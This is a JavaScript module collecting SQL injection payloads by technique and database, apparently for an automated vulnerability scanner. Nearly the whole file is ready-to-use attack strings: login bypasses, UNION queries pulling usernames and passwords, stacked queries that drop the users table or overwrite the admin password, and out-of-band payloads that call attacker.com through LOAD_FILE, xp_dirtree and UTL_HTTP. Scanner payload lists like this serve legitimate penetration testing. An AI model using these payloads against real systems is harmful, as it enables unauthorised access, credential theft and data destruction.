// SQL Injection Payloads Database
// Comprehensive collection of SQLi payloads for automated testing

const SQLiPayloads = {
    // Boolean-based blind SQL injection
    boolean: [
        // Auth Bypass / Simple Comments
        "'-- ",
        "' #",
        "'/*",
        "admin'-- ",
        "admin' #",
        "admin'/*",
        // Boolean Blind
        "' OR '1'='1",
        "' OR '1'='1'-- ",
        "' OR '1'='1'/*",
        "' OR 1=1-- ",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin' OR '1'='1",
        "admin' OR '1'='1'-- ",
        "admin' OR '1'='1'#",
        "' OR 'a'='a",
        "' OR 'a'='a'-- ",
        "') OR ('1'='1",
        "') OR ('1'='1'-- ",
        "' OR '1'='1' AND 'a'='a",
        "1' OR '1'='1",
        "1' OR '1'='1'-- ",
        "' OR 1=1 LIMIT 1-- ",
        "' OR 1=1 LIMIT 1#",
        "' OR 1=1 LIMIT 1/*",
        "' OR 'x'='x",
        "') OR '1'='1'-- ",
        "' OR 1=1-- ",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR '1'='1' -- ",
        "' OR '1'='1' #",
        "' OR '1'='1' /*"
    ],

    // UNION-based SQL injection
    union: [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 'a',NULL--",
        "' UNION SELECT NULL,'a'--",
        "' UNION SELECT 'a','a'--",
        "' UNION SELECT 'a',NULL,NULL--",
        "' UNION SELECT NULL,'a',NULL--",
        "' UNION SELECT NULL,NULL,'a'--",
        "' UNION SELECT @@version,NULL--",
        "' UNION SELECT NULL,@@version--",
        "' UNION SELECT database(),NULL--",
        "' UNION SELECT NULL,database()--",
        "' UNION SELECT user(),NULL--",
        "' UNION SELECT NULL,user()--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT NULL,table_name FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL FROM information_schema.columns--",
        "' UNION SELECT NULL,column_name FROM information_schema.columns--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT NULL,username,password FROM users--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--"
    ],

    // Time-based blind SQL injection
    timeBased: [
        "' AND SLEEP(5)--",
        "' AND SLEEP(5)#",
        "' AND SLEEP(5)/*",
        "'; WAITFOR DELAY '00:00:05'--",
        "'; WAITFOR DELAY '00:00:05'#",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#",
        "' OR SLEEP(5)--",
        "' OR SLEEP(5)#",
        "1' AND SLEEP(5)--",
        "1' AND SLEEP(5)#",
        "' AND IF(1=1,SLEEP(5),0)--",
        "' AND IF(1=1,SLEEP(5),0)#",
        "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
        "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)#",
        "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        "' AND BENCHMARK(5000000,MD5('A'))--",
        "' AND BENCHMARK(5000000,MD5('A'))#",
        "' OR BENCHMARK(5000000,MD5('A'))--",
        "' OR BENCHMARK(5000000,MD5('A'))#"
    ],

    // Error-based SQL injection
    errorBased: [
        "' AND 1=CONVERT(int, @@version)--",
        "' AND 1=CONVERT(int, @@version)#",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND 1=CONVERT(int, (SELECT @@version))#",
        "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT @@version)))--",
        "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT @@version)))#",
        "' AND UPDATEXML(1, CONCAT(0x5c, (SELECT @@version)), 1)--",
        "' AND UPDATEXML(1, CONCAT(0x5c, (SELECT @@version)), 1)#",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)#",
        "' AND EXP(~(SELECT * FROM (SELECT @@version)x))--",
        "' AND EXP(~(SELECT * FROM (SELECT @@version)x))#",
        "' AND GTID_SUBSET(@@version,1)--",
        "' AND GTID_SUBSET(@@version,1)#",
        "' AND JSON_KEYS((SELECT CONVERT((SELECT @@version) USING utf8)))--",
        "' AND JSON_KEYS((SELECT CONVERT((SELECT @@version) USING utf8)))#"
    ],

    // Stacked queries
    stacked: [
        "'; DROP TABLE users--",
        "'; DROP TABLE users#",
        "'; SELECT SLEEP(5)--",
        "'; SELECT SLEEP(5)#",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "'; INSERT INTO users VALUES('hacker','password')#",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'#"
    ],

    // Out-of-band (OOB) SQL injection
    outOfBand: [
        "' UNION SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\a')--",
        "' UNION SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\a')#",
        "'; EXEC master..xp_dirtree '\\\\\\\\attacker.com\\\\a'--",
        "'; EXEC master..xp_dirtree '\\\\\\\\attacker.com\\\\a'#",
        "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM dual--",
        "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM dual#"
    ],

    // Second-order SQL injection
    secondOrder: [
        "admin'--",
        "admin'#",
        "admin'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*"
    ],

    // Database-specific payloads
    mysql: [
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns--"
    ],

    postgresql: [
        "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT version(),NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT tablename,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM pg_tables--"
    ],

    mssql: [
        "'; WAITFOR DELAY '00:00:05'--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM sys.tables--"
    ],

    oracle: [
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM dual--",
        "' UNION SELECT banner,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM v$version--",
        "' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM all_tables--"
    ]
};

// Get all payloads for a specific attack type
function getPayloadsByType(type) {
    return SQLiPayloads[type] || [];
}

// Get all payloads
function getAllPayloads() {
    const all = [];
    for (const type in SQLiPayloads) {
        all.push(...SQLiPayloads[type].map(payload => ({
            type: type,
            payload: payload
        })));
    }
    return all;
}

// Get payload count
function getPayloadCount() {
    let count = 0;
    for (const type in SQLiPayloads) {
        count += SQLiPayloads[type].length;
    }
    return count;
}

// Export for use in scanner
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { SQLiPayloads, getPayloadsByType, getAllPayloads, getPayloadCount };
}
